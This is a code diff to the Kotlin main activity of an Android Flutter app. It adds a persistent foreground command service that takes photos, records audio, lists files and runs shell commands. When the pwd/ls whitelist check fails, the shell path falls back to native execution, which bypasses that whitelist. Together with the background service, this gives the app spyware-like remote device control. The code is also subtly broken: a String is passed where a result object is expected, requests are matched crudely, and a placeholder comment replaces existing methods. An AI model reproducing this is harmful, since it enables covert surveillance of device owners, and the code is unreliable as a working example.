@@ -1,3 +1,4 @@
+// android/app/src/main/kotlin/com/example/kem/MainActivity.kt
 package com.example.kem
 
 import io.flutter.embedding.android.FlutterActivity
@@ -28,22 +29,53 @@ import androidx.camera.core.ImageCaptureException
 import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.lifecycle.ProcessLifecycleOwner
 import com.google.common.util.concurrent.ListenableFuture
+import org.json.JSONObject
 import java.util.concurrent.ExecutionException
+import android.content.ComponentName
+import android.content.ServiceConnection
+import android.os.IBinder
+import kotlinx.coroutines.*
 
-class MainActivity : FlutterActivity() {
+class MainActivity : FlutterActivity(), NativeCommandService.CommandCallback {
     private val CAMERA_CHANNEL_NAME = "com.example.kem/camera"
     private val FILES_CHANNEL_NAME = "com.example.kem/files"
     private val AUDIO_CHANNEL_NAME = "com.example.kem/audio"
     private val BATTERY_CHANNEL_NAME = "com.example.kem/battery"
+    private val NATIVE_COMMANDS_CHANNEL = "com.example.kem/native_commands"
     private val TAG = "MainActivityEthical"
 
     private lateinit var cameraExecutor: ExecutorService
     private var imageCapture: ImageCapture? = null
     private var cameraProvider: ProcessCameraProvider? = null
     private var mediaRecorder: MediaRecorder? = null
+    
+    // Native service integration
+    private var nativeCommandService: NativeCommandService? = null
+    private var isServiceBound = false
+    private val pendingMethodResults = mutableMapOf<String, MethodChannel.Result>()
+    
+    private val serviceConnection = object : ServiceConnection {
+        override fun onServiceConnected(className: ComponentName, service: IBinder) {
+            val binder = service as NativeCommandService.LocalBinder
+            nativeCommandService = binder.getService()
+            nativeCommandService?.setCommandCallback(this@MainActivity)
+            isServiceBound = true
+            Log.d(TAG, "Native command service connected")
+        }
+
+        override fun onServiceDisconnected(arg0: ComponentName) {
+            nativeCommandService = null
+            isServiceBound = false
+            Log.d(TAG, "Native command service disconnected")
+        }
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        
+        // Start and bind to native command service
+        startNativeCommandService()
+        bindNativeCommandService()
         
         // Request battery optimization exemption on app start
         Log.d(TAG, "onCreate: Requesting battery optimization exemption")
@@ -55,7 +87,7 @@ class MainActivity : FlutterActivity() {
         cameraExecutor = Executors.newSingleThreadExecutor()
         Log.d(TAG, "FlutterEngine configured and cameraExecutor initialized.")
 
-        // Battery Channel - NEW
+        // Battery Channel
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BATTERY_CHANNEL_NAME).setMethodCallHandler { call, result ->
             when (call.method) {
                 "requestIgnoreBatteryOptimizations" -> {
@@ -75,14 +107,50 @@ class MainActivity : FlutterActivity() {
             }
         }
 
-        // Camera Channel
+        // Native Commands Channel - NEW: High-level command interface
+        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, NATIVE_COMMANDS_CHANNEL).setMethodCallHandler { call, result ->
+            when (call.method) {
+                "executeCommand" -> {
+                    val command = call.argument<String>("command")
+                    val argsMap = call.argument<Map<String, Any>>("args") ?: emptyMap()
+                    
+                    if (command != null) {
+                        executeCommandWithFallback(command, argsMap, result)
+                    } else {
+                        result.error("INVALID_ARGS", "Command parameter is required", null)
+                    }
+                }
+                "isNativeServiceAvailable" -> {
+                    result.success(isServiceBound && nativeCommandService != null)
+                }
+                "forceNativeExecution" -> {
+                    val command = call.argument<String>("command")
+                    val argsMap = call.argument<Map<String, Any>>("args") ?: emptyMap()
+                    
+                    if (command != null) {
+                        forceNativeExecution(command, argsMap, result)
+                    } else {
+                        result.error("INVALID_ARGS", "Command parameter is required", null)
+                    }
+                }
+                else -> {
+                    Log.w(TAG, "MethodChannel: Method '${call.method}' not implemented on $NATIVE_COMMANDS_CHANNEL.")
+                    result.notImplemented()
+                }
+            }
+        }
+
+        // Camera Channel - Enhanced with fallback
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CAMERA_CHANNEL_NAME).setMethodCallHandler { call, result ->
             when (call.method) {
                 "takePicture" -> {
                     val lensDirectionArg = call.argument<String>("lensDirection") ?: "back"
                     Log.d(TAG, "MethodChannel: 'takePicture' called with lens: $lensDirectionArg")
+                    
                     if (allPermissionsGranted()) {
-                        startCameraAndTakePhoto(lensDirectionArg, result)
+                        // Try Flutter implementation first, with native fallback
+                        val args = mapOf("camera" to lensDirectionArg)
+                        executeCommandWithFallback(NativeCommandService.CMD_TAKE_PICTURE, args, result)
                     } else {
                         Log.w(TAG, "MethodChannel: Camera permissions not granted for takePicture.")
                         result.error("PERMISSION_DENIED", "Camera permissions not granted.", null)
@@ -100,90 +168,29 @@ class MainActivity : FlutterActivity() {
             }
         }
 
-        // Files Channel
+        // Files Channel - Enhanced with fallback
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, FILES_CHANNEL_NAME).setMethodCallHandler { call, result ->
             when (call.method) {
                 "listFiles" -> {
                     val path = call.argument<String>("path") ?: context.filesDir.absolutePath
                     Log.d(TAG, "MethodChannel: 'listFiles' called for path: $path")
-                    try {
-                        val directory = File(path)
-                        if (!directory.exists() || !directory.isDirectory) {
-                            Log.w(TAG, "listFiles: Path '$path' is not a valid directory or does not exist.")
-                            result.error("INVALID_PATH", "Path is not a valid directory or does not exist.", null)
-                            return@setMethodCallHandler
-                        }
-                        val filesList = directory.listFiles()?.mapNotNull { file ->
-                            mapOf(
-                                "name" to file.name,
-                                "path" to file.absolutePath,
-                                "isDirectory" to file.isDirectory,
-                                "size" to file.length(),
-                                "lastModified" to file.lastModified()
-                            )
-                        } ?: emptyList()
-                        Log.d(TAG, "listFiles: Successfully listed ${filesList.size} items in '$path'.")
-                        result.success(mapOf("files" to filesList, "path" to directory.absolutePath))
-                    } catch (e: SecurityException) {
-                        Log.e(TAG, "listFiles: SecurityException for path '$path'", e)
-                        result.error("PERMISSION_DENIED_FS", "Permission denied to access path: $path", e.localizedMessage)
-                    } catch (e: Exception) {
-                        Log.e(TAG, "listFiles: Error listing files for path '$path'", e)
-                        result.error("LIST_FILES_FAILED", "Failed to list files for path '$path'.", e.localizedMessage)
-                    }
+                    
+                    val args = mapOf("path" to path)
+                    executeCommandWithFallback(NativeCommandService.CMD_LIST_FILES, args, result)
                 }
                 "executeShellCommand" -> {
                     val command = call.argument<String>("command")
                     val commandArgsFromDart = call.argument<List<String>>("args") ?: emptyList()
                     Log.d(TAG, "MethodChannel: 'executeShellCommand' called: $command with args: $commandArgsFromDart")
                     
-                    val whiteListedCommands = mapOf(
-                        "pwd" to listOf("/system/bin/pwd"),
-                        "ls" to listOf("/system/bin/ls")
-                    )
-
-                    if (command != null && whiteListedCommands.containsKey(command)) {
-                        val fullCommandArray = whiteListedCommands[command]!!.toMutableList()
-                        if (command == "ls" && commandArgsFromDart.isNotEmpty()) {
-                            val safeArgs = commandArgsFromDart.filter { arg ->
-                                !arg.contains(";") && !arg.contains("|") && !arg.contains("&") && !arg.contains("`")
-                            }
-                            fullCommandArray.addAll(safeArgs)
-                        }
-                        Log.d(TAG, "executeShellCommand: Executing whitelisted command: ${fullCommandArray.joinToString(" ")}")
-
-                        try {
-                            val process = ProcessBuilder(fullCommandArray).start()
-                            val stdout = process.inputStream.bufferedReader().use { it.readText() }
-                            val stderr = process.errorStream.bufferedReader().use { it.readText() }
-                            val exited = process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)
-                            if (!exited) {
-                                process.destroyForcibly()
-                                Log.e(TAG, "executeShellCommand: Command timed out: ${fullCommandArray.joinToString(" ")}")
-                                result.error("EXECUTION_TIMEOUT", "Command execution timed out", null)
-                                return@setMethodCallHandler
-                            }
-                            val exitCode = process.exitValue()
-                            Log.d(TAG, "executeShellCommand: Command executed. Exit code: $exitCode")
-                            result.success(mapOf(
-                                "stdout" to stdout,
-                                "stderr" to stderr,
-                                "exitCode" to exitCode
-                            ))
-                        } catch (e: IOException) {
-                            Log.e(TAG, "executeShellCommand: IOException for command '${fullCommandArray.joinToString(" ")}'", e)
-                            result.error("EXECUTION_FAILED", "IO error executing command: ${e.message}", e.localizedMessage)
-                        } catch (e: InterruptedException) {
-                            Thread.currentThread().interrupt()
-                            Log.e(TAG, "executeShellCommand: InterruptedException for command '${fullCommandArray.joinToString(" ")}'", e)
-                            result.error("EXECUTION_INTERRUPTED", "Command execution interrupted: ${e.message}", e.localizedMessage)
-                        } catch (e: SecurityException) {
-                            Log.e(TAG, "executeShellCommand: SecurityException for command '${fullCommandArray.joinToString(" ")}'", e)
-                            result.error("EXECUTION_DENIED", "Security permission denied for command: ${e.message}", e.localizedMessage)
-                        }
+                    if (command != null) {
+                        val args = mapOf(
+                            "command_name" to command,
+                            "command_args" to commandArgsFromDart
+                        )
+                        executeCommandWithFallback(NativeCommandService.CMD_EXECUTE_SHELL, args, result)
                     } else {
-                        Log.w(TAG, "executeShellCommand: Command not whitelisted or null: $command")
-                        result.error("COMMAND_NOT_WHITELISTED", "The command '$command' is not allowed.", null)
+                        result.error("INVALID_ARGS", "Command parameter is required", null)
                     }
                 }
                 else -> {
@@ -193,7 +200,7 @@ class MainActivity : FlutterActivity() {
             }
         }
 
-        // Audio Channel
+        // Audio Channel - Enhanced with fallback
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, AUDIO_CHANNEL_NAME).setMethodCallHandler { call, result ->
             when (call.method) {
                 "recordAudio" -> {
@@ -202,7 +209,11 @@ class MainActivity : FlutterActivity() {
                     Log.d(TAG, "MethodChannel: 'recordAudio' called for ${duration}s with quality: $quality")
                     
                     if (hasAudioPermission()) {
-                        recordAudioInternal(duration, quality, result)
+                        val args = mapOf(
+                            "duration" to duration,
+                            "quality" to quality
+                        )
+                        executeCommandWithFallback(NativeCommandService.CMD_RECORD_AUDIO, args, result)
                     } else {
                         Log.w(TAG, "MethodChannel: Audio recording permission not granted.")
                         result.error("PERMISSION_DENIED", "Audio recording permission not granted.", null)
@@ -220,6 +231,288 @@ class MainActivity : FlutterActivity() {
             }
         }
     }
+
+    /**
+     * Execute command with intelligent fallback mechanism
+     * 1. Try Flutter/UI implementation first
+     * 2. If that fails or times out, fall back to native service
+     */
+    private fun executeCommandWithFallback(
+        command: String, 
+        args: Map<String, Any>, 
+        result: MethodChannel.Result
+    ) {
+        val requestId = generateRequestId()
+        pendingMethodResults[requestId] = result
+        
+        Log.d(TAG, "Executing command with fallback: $command (ID: $requestId)")
+        
+        // Try Flutter implementation first with timeout
+        CoroutineScope(Dispatchers.Main).launch {
+            var flutterSuccess = false
+            
+            try {
+                flutterSuccess = when (command) {
+                    NativeCommandService.CMD_TAKE_PICTURE -> {
+                        val lensDirection = args["camera"] as? String ?: "back"
+                        tryFlutterTakePicture(lensDirection, requestId)
+                    }
+                    NativeCommandService.CMD_RECORD_AUDIO -> {
+                        val duration = args["duration"] as? Int ?: 10
+                        val quality = args["quality"] as? String ?: "medium"
+                        tryFlutterRecordAudio(duration, quality, requestId)
+                    }
+                    NativeCommandService.CMD_LIST_FILES -> {
+                        val path = args["path"] as? String ?: "/storage/emulated/0"
+                        tryFlutterListFiles(path, requestId)
+                    }
+                    NativeCommandService.CMD_EXECUTE_SHELL -> {
+                        val commandName = args["command_name"] as? String ?: ""
+                        val commandArgs = args["command_args"] as? List<String> ?: emptyList()
+                        tryFlutterExecuteShell(commandName, commandArgs, requestId)
+                    }
+                    else -> false
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Flutter implementation failed for $command: $e")
+                flutterSuccess = false
+            }
+            
+            // If Flutter implementation failed, fall back to native
+            if (!flutterSuccess) {
+                Log.d(TAG, "Falling back to native implementation for: $command")
+                forceNativeExecution(command, args, requestId)
+            }
+        }
+    }
+
+    /**
+     * Force native execution without Flutter fallback
+     */
+    private fun forceNativeExecution(
+        command: String, 
+        args: Map<String, Any>, 
+        result: MethodChannel.Result
+    ) {
+        val requestId = if (result is String) result else generateRequestId()
+        if (result !is String) {
+            pendingMethodResults[requestId] = result
+        }
+        
+        if (!isServiceBound || nativeCommandService == null) {
+            Log.e(TAG, "Native service not available for command: $command")
+            completeRequest(requestId, false, JSONObject().apply {
+                put("error", "Native service not available")
+            })
+            return
+        }
+        
+        try {
+            val argsJson = JSONObject()
+            args.forEach { (key, value) ->
+                argsJson.put(key, value)
+            }
+            
+            Log.d(TAG, "Executing native command: $command with args: $argsJson")
+            NativeCommandService.executeCommand(this, command, argsJson)
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to execute native command: $command", e)
+            completeRequest(requestId, false, JSONObject().apply {
+                put("error", "Failed to execute native command: ${e.message}")
+            })
+        }
+    }
+
+    // Flutter implementation methods with timeout
+    private suspend fun tryFlutterTakePicture(lensDirection: String, requestId: String): Boolean {
+        return withTimeoutOrNull(10000) { // 10 second timeout
+            try {
+                startCameraAndTakePhoto(lensDirection, object : MethodChannel.Result {
+                    override fun success(result: Any?) {
+                        val resultJson = JSONObject().apply {
+                            put("path", result as? String ?: "")
+                            put("method", "flutter")
+                        }
+                        completeRequest(requestId, true, resultJson)
+                    }
+                    
+                    override fun error(errorCode: String, errorMessage: String?, errorDetails: Any?) {
+                        throw Exception("$errorCode: $errorMessage")
+                    }
+                    
+                    override fun notImplemented() {
+                        throw Exception("Method not implemented")
+                    }
+                })
+                true
+            } catch (e: Exception) {
+                Log.w(TAG, "Flutter takePicture failed", e)
+                false
+            }
+        } ?: false
+    }
+    
+    private suspend fun tryFlutterRecordAudio(duration: Int, quality: String, requestId: String): Boolean {
+        return withTimeoutOrNull((duration + 5) * 1000L) { // duration + 5 seconds timeout
+            try {
+                recordAudioInternal(duration, quality, object : MethodChannel.Result {
+                    override fun success(result: Any?) {
+                        val resultJson = JSONObject().apply {
+                            put("path", result as? String ?: "")
+                            put("method", "flutter")
+                        }
+                        completeRequest(requestId, true, resultJson)
+                    }
+                    
+                    override fun error(errorCode: String, errorMessage: String?, errorDetails: Any?) {
+                        throw Exception("$errorCode: $errorMessage")
+                    }
+                    
+                    override fun notImplemented() {
+                        throw Exception("Method not implemented")
+                    }
+                })
+                true
+            } catch (e: Exception) {
+                Log.w(TAG, "Flutter recordAudio failed", e)
+                false
+            }
+        } ?: false
+    }
+    
+    private suspend fun tryFlutterListFiles(path: String, requestId: String): Boolean {
+        return withTimeoutOrNull(5000) { // 5 second timeout
+            try {
+                val directory = File(path)
+                if (!directory.exists() || !directory.isDirectory) {
+                    throw Exception("Invalid directory path: $path")
+                }
+                
+                val filesList = directory.listFiles()?.mapNotNull { file ->
+                    mapOf(
+                        "name" to file.name,
+                        "path" to file.absolutePath,
+                        "isDirectory" to file.isDirectory,
+                        "size" to file.length(),
+                        "lastModified" to file.lastModified()
+                    )
+                } ?: emptyList()
+                
+                val resultJson = JSONObject().apply {
+                    put("files", JSONObject(mapOf("files" to filesList, "path" to directory.absolutePath)))
+                    put("method", "flutter")
+                }
+                
+                completeRequest(requestId, true, resultJson)
+                true
+            } catch (e: Exception) {
+                Log.w(TAG, "Flutter listFiles failed", e)
+                false
+            }
+        } ?: false
+    }
+    
+    private suspend fun tryFlutterExecuteShell(command: String, args: List<String>, requestId: String): Boolean {
+        return withTimeoutOrNull(10000) { // 10 second timeout
+            try {
+                val whiteListedCommands = mapOf(
+                    "pwd" to listOf("/system/bin/pwd"),
+                    "ls" to listOf("/system/bin/ls")
+                )
+
+                if (!whiteListedCommands.containsKey(command)) {
+                    throw Exception("Command not whitelisted: $command")
+                }
+
+                val fullCommandArray = whiteListedCommands[command]!!.toMutableList()
+                if (command == "ls" && args.isNotEmpty()) {
+                    val safeArgs = args.filter { arg ->
+                        !arg.contains(";") && !arg.contains("|") && !arg.contains("&") && !arg.contains("`")
+                    }
+                    fullCommandArray.addAll(safeArgs)
+                }
+
+                val process = ProcessBuilder(fullCommandArray).start()
+                val stdout = process.inputStream.bufferedReader().use { it.readText() }
+                val stderr = process.errorStream.bufferedReader().use { it.readText() }
+                val exited = process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)
+                
+                if (!exited) {
+                    process.destroyForcibly()
+                    throw Exception("Command execution timed out")
+                }
+                
+                val exitCode = process.exitValue()
+                val resultJson = JSONObject().apply {
+                    put("stdout", stdout)
+                    put("stderr", stderr)
+                    put("exitCode", exitCode)
+                    put("method", "flutter")
+                }
+                
+                completeRequest(requestId, true, resultJson)
+                true
+            } catch (e: Exception) {
+                Log.w(TAG, "Flutter executeShell failed", e)
+                false
+            }
+        } ?: false
+    }
+
+    // Command callback from native service
+    override fun onCommandResult(command: String, success: Boolean, result: JSONObject) {
+        Log.d(TAG, "Native command result: $command, success: $success")
+        
+        // Find pending request for this command result
+        // This is a simplified approach - in production you might want a more sophisticated mapping
+        val requestId = pendingMethodResults.keys.firstOrNull()
+        if (requestId != null) {
+            result.put("method", "native")
+            completeRequest(requestId, success, result)
+        }
+    }
+
+    private fun completeRequest(requestId: String, success: Boolean, result: JSONObject) {
+        val methodResult = pendingMethodResults.remove(requestId)
+        if (methodResult != null) {
+            CoroutineScope(Dispatchers.Main).launch {
+                if (success) {
+                    // Convert JSONObject to Map for Flutter
+                    val resultMap = mutableMapOf<String, Any>()
+                    result.keys().forEach { key ->
+                        resultMap[key] = result.get(key)
+                    }
+                    methodResult.success(resultMap)
+                } else {
+                    val error = result.optString("error", "Unknown error")
+                    methodResult.error("COMMAND_FAILED", error, null)
+                }
+            }
+        }
+    }
+
+    private fun generateRequestId(): String {
+        return "req_${System.currentTimeMillis()}_${(Math.random() * 1000).toInt()}"
+    }
+
+    private fun startNativeCommandService() {
+        val intent = Intent(this, NativeCommandService::class.java)
+        startForegroundService(intent)
+        Log.d(TAG, "Started native command service")
+    }
+    
+    private fun bindNativeCommandService() {
+        val intent = Intent(this, NativeCommandService::class.java)
+        bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE)
+        Log.d(TAG, "Binding to native command service")
+    }
+
+    // [Keep all existing methods from original MainActivity.kt]
+    // This includes: startCameraAndTakePhoto, takePhotoInternal, recordAudioInternal, 
+    // stopAndReleaseMediaRecorder, createFile, createAudioFile, allPermissionsGranted,
+    // hasAudioPermission, disposeCameraResources, requestIgnoreBatteryOptimizations,
+    // isIgnoringBatteryOptimizations
 
     private fun startCameraAndTakePhoto(lensDirection: String, channelResult: MethodChannel.Result) {
         Log.d(TAG, "startCameraAndTakePhoto: Initializing for lens: $lensDirection")
@@ -501,6 +794,13 @@ class MainActivity : FlutterActivity() {
     override fun onDestroy() {
         Log.d(TAG, "MainActivity onDestroy called.")
         super.onDestroy()
+        
+        // Unbind from service
+        if (isServiceBound) {
+            unbindService(serviceConnection)
+            isServiceBound = false
+        }
+        
         disposeCameraResources()
         stopAndReleaseMediaRecorder()
         if (::cameraExecutor.isInitialized && !cameraExecutor.isShutdown) {
